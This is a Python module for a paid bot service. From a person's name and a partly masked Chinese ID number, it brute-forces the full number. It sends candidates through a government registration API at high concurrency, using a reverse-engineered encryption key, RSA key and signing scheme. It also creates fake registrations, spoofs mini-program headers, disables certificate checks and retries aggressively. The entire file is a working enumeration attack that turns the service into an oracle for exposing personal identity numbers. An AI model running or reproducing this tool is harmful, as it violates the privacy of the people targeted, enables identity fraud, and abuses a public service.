# modules/id_check.py
import re
import time
import random
import string
import json
import hashlib
import binascii
import ssl
import urllib.request
import urllib.error
import itertools
import threading
import queue
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# ===================== 全局常量 =====================
API_URL = "https://zwyd.mca.gov.cn/ggfwappbiz/public/neuRegister/register"
AES_KEY = "o7wwuqr7cy84415k"
RSA_N_HEX = "906C793510FB049452764740B21B97A51DAEA794AB6E43836269D5E6317D49226C12362BA22DAB5EC3BC79553A8A098B01F3C4D81A87B3EE5BD2F4F1431CC495EE2FE54688B212145BB32D56EEEEE1430CE26234331B291CFC53C9B84FAFFDF0B44371A032880C3D567F588D2CD5FCE28D9CDD2923CB547DAD219A6A1B8B5D3D"
RSA_E_HEX = "10001"
APP_KEY = "neujmggfw01@MZB"

# ===================== 地区码字典（从 TXT 文件加载） =====================
diquma = {}
DIQ_UMA_PATTERN_CACHE = {}

def init_diquma(file_path=None):
    """
    从外部 TXT 文件加载地区码字典。
    文件格式：每行 code,name（逗号分隔），如 "110101,北京市东城区"
    默认查找当前目录下的 area_code.txt
    """
    global diquma
    if file_path is None:
        file_path = os.path.join(os.path.dirname(__file__), "area_code.txt")
    try:
        with open(file_path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                parts = line.split(",", 1)
                if len(parts) == 2:
                    code, name = parts[0].strip(), parts[1].strip()
                    diquma[code] = name
        if not diquma:
            raise ValueError("文件为空或格式错误")
        print(f"✅ 成功加载 {len(diquma)} 条地区码")
    except Exception as e:
        print(f"❌ 加载地区码文件失败：{e}")
        raise

# ===================== 加密工具函数 =====================
def rand_str(n=16):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

def aes_enc(text, key, iv):
    c = AES.new(key.encode(), AES.MODE_CBC, iv=iv.encode())
    return binascii.hexlify(c.encrypt(pad(text.encode(), AES.block_size))).decode().upper()

def aes_dec(hex_text, key, iv):
    c = AES.new(key.encode(), AES.MODE_CBC, iv=iv.encode())
    return unpad(c.decrypt(binascii.unhexlify(hex_text)), AES.block_size).decode()

def rsa_enc(text):
    n, e = int(RSA_N_HEX, 16), int(RSA_E_HEX, 16)
    m_hex = ''.join(hex(ord(c))[2:].zfill(2) for c in reversed(text))
    return hex(pow(int(m_hex, 16), e, n))[2:].zfill(256)

def sign(ts, en_str):
    return hashlib.md5(f"appKey={APP_KEY}&timestamp={ts}&enStr={en_str}".encode()).hexdigest()

def check_pwd(p):
    kb = ["qwertyuiop", "asdfghjkl", "zxcvbnm", "1234567890", "abcdefghijklmnopqrstuvwxyz"]
    p = p.lower()
    for k in kb:
        for i in range(len(k)-2):
            if k[i:i+3] in p or k[i:i+3][::-1] in p:
                return True
    return False

def generate_password():
    while True:
        pwd = list(random.choice(string.ascii_lowercase) + random.choice(string.ascii_uppercase) + 
                   random.choice(string.digits) + ''.join(random.choices(string.ascii_letters + string.digits, k=9)))
        random.shuffle(pwd)
        pwd = ''.join(pwd)
        if not check_pwd(pwd):
            return pwd

# ===================== 身份证生成器（流式，极低 CPU） =====================
def address_lookup(card_address):
    pattern_str = card_address.lower().replace('x', r'\d')
    if pattern_str not in DIQ_UMA_PATTERN_CACHE:
        DIQ_UMA_PATTERN_CACHE[pattern_str] = re.compile(f'^{pattern_str}$')
    pattern = DIQ_UMA_PATTERN_CACHE[pattern_str]
    for code, name in diquma.items():
        if pattern.match(code):
            yield code

def check_id_data(n):
    if len(n) < 14:
        return False
    try:
        year = int(n[6:10]); month = int(n[10:12]); day = int(n[12:14])
    except ValueError:
        return False
    if year < 1950 or year > time.localtime().tm_year:
        return False
    if month < 1 or month > 12 or day < 1 or day > 31:
        return False
    if month in (4,6,9,11) and day > 30:
        return False
    if month == 2:
        leap = (year % 4 == 0 and year % 100 != 0) or (year % 400 == 0)
        if day > (29 if leap else 28):
            return False
    return True

def check_id(n):
    if len(n) != 18:
        return False
    var = (7,9,10,5,8,4,2,1,6,3,7,9,10,5,8,4,2)
    var_id = ('1','0','X','9','8','7','6','5','4','3','2')
    try:
        s = 0
        for i in range(17):
            s += int(n[i]) * var[i]
        return var_id[s % 11] == n[17]
    except:
        return False

def generate_candidates(card, input_gender=None):
    if len(card) != 18:
        if len(card) < 18:
            card = card.ljust(18, 'x')[:18]
        else:
            card = card[:18]

    if not all(c in '0123456789xX' for c in card):
        return

    addr_part = card[:6]
    if 'x' in addr_part:
        addr_codes = list(address_lookup(addr_part))
        if not addr_codes:
            return
    else:
        addr_codes = [addr_part]

    digits = []
    for i, ch in enumerate(card):
        if ch != 'x':
            digits.append([ch])
        else:
            if i == 16:
                if input_gender == '男':
                    digits.append(['1','3','5','7','9'])
                elif input_gender == '女':
                    digits.append(['0','2','4','6','8'])
                else:
                    digits.append(['0','1','2','3','4','5','6','7','8','9'])
            elif i == 17:
                digits.append(['0','1','2','3','4','5','6','7','8','9','X'])
            else:
                digits.append(['0','1','2','3','4','5','6','7','8','9'])

    count = 0
    for comb in itertools.product(*digits):
        id_str = ''.join(comb)
        if id_str[:6] in addr_codes and check_id_data(id_str) and check_id(id_str):
            yield id_str
        count += 1
        if count % 100 == 0:
            time.sleep(0)

# ===================== 核验函数（单次请求，含重试） =====================
def parse_response(resp):
    errs = resp.get("errors", [])
    if resp.get("serviceSuccess") and not errs:
        return True, "二要素匹配"
    if errs:
        msg = errs[0].get("msg", "")
        if "已被注册" in msg:
            return True, "已被注册"
        if "不匹配" in msg:
            return False, "姓名与身份证号不匹配"
        return None, msg
    return None, "无法判断"

def verify_single(name, cert_no, max_retries=100):
    for attempt in range(1, max_retries + 1):
        iv = rand_str()
        loginid = random.choice(string.ascii_lowercase) + rand_str(11)
        pwd = generate_password()
        ts = int(time.time() * 1000)

        payload = {
            "loginid": loginid,
            "password": rsa_enc(pwd),
            "accountType": "10",
            "name": name,
            "certType": "111",
            "certNo": cert_no,
            "mobile": "18888888888",
            "nationality": "CHN",
            "field3": "2026-05-18",
            "field4": "2031-05-18",
            "registerType": "1",
            "PLATFORM": "4",
            "PLATFORMID": "oFtC6s8ajY9CyBkpVW95srxe25ZA",
            "timestamp": ts
        }

        en_str = aes_enc(json.dumps(payload, separators=(',', ':')), AES_KEY, iv)
        body = {
            "enStr": en_str,
            "sign": sign(ts, en_str),
            "iv": rsa_enc(iv)
        }

        headers = {
            'Referer': 'https://servicewechat.com/wx12f5a00807e3ec6a/137/page-frame.html',
            'Content-Type': 'application/json',
            'PLATFORM': '4',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36',
            'Host': 'zwyd.mca.gov.cn'
        }

        try:
            req = urllib.request.Request(API_URL, data=json.dumps(body, separators=(',', ':')).encode(),
                                         headers=headers, method='POST')
            with urllib.request.urlopen(req, context=ssl._create_unverified_context(), timeout=15) as resp:
                data = json.loads(resp.read().decode())
                result = aes_dec(data["data"], AES_KEY, iv) if data.get("data") else json.dumps(data)
                resp_json = json.loads(result) if isinstance(result, str) else result
                is_match, msg = parse_response(resp_json)

                if is_match is not None:
                    return cert_no, is_match, msg

                retry_keywords = ("键盘连续字符", "无法判断", "密码", "网络", "超时", "服务", "繁忙")
                if attempt < max_retries and any(kw in msg for kw in retry_keywords):
                    continue
                else:
                    return cert_no, None, msg

        except Exception as e:
            if attempt < max_retries:
                continue
            else:
                return cert_no, None, str(e)

    return cert_no, None, "未知错误"

# ===================== 主入口（生产者‑消费者，超高并发，低CPU） =====================
def run(user_input: str) -> str:
    if not diquma:
        try:
            init_diquma()
        except Exception as e:
            return f"❌ 地区码文件加载失败：{e}，请检查 area_code.txt 是否存在"

    parts = user_input.strip().split()
    if len(parts) < 2:
        return "❌ 格式错误，请输入：姓名 模糊身份证（如：张三 110101xxxxxxxxxxxx）"
    name = parts[0]
    card = parts[1]

    MAX_WORKERS = 50
    QUEUE_SIZE = 500
    stop_event = threading.Event()
    result_queue = queue.Queue()
    checked = 0
    start_time = time.time()

    task_queue = queue.Queue(maxsize=QUEUE_SIZE)

    def producer():
        try:
            for cert in generate_candidates(card):
                if stop_event.is_set():
                    break
                task_queue.put(cert, timeout=0.1)
        except queue.Full:
            pass
        finally:
            for _ in range(MAX_WORKERS):
                task_queue.put(None)

    def consumer(worker_id):
        nonlocal checked
        while not stop_event.is_set():
            try:
                cert = task_queue.get(timeout=0.1)
            except queue.Empty:
                continue
            if cert is None:
                break
            cert_no, is_match, msg = verify_single(name, cert)
            checked += 1
            if is_match is True:
                result_queue.put((cert_no, msg))
                stop_event.set()
                break

    producer_thread = threading.Thread(target=producer, daemon=True)
    producer_thread.start()

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = [executor.submit(consumer, i) for i in range(MAX_WORKERS)]
        found = False
        while not stop_event.is_set():
            if not result_queue.empty():
                cert, msg = result_queue.get_nowait()
                found = True
                break
            if all(f.done() for f in futures):
                break
            time.sleep(0.01)
        for f in futures:
            try:
                f.result(timeout=1)
            except:
                pass

    producer_thread.join(timeout=1)

    elapsed = time.time() - start_time
    if found:
        return f"✅ 匹配成功！\n姓名：{name}\n身份证：{cert}\n状态：{msg}\n耗时：{elapsed:.2f} 秒"
    else:
        return f"❌ 未找到匹配的身份证。\n共核验 {checked} 条\n耗时：{elapsed:.2f} 秒"

# ===================== 注册到积分系统 =====================
from . import register
register(
    key="bq",
    title="补齐",
    emoji="🆔",
    tier="paid",
    cost=1,
    prompt="请输入姓名和模糊身份证（用空格分隔），如：张三 110101xxxxxxxxxxxx",
    run=run,
)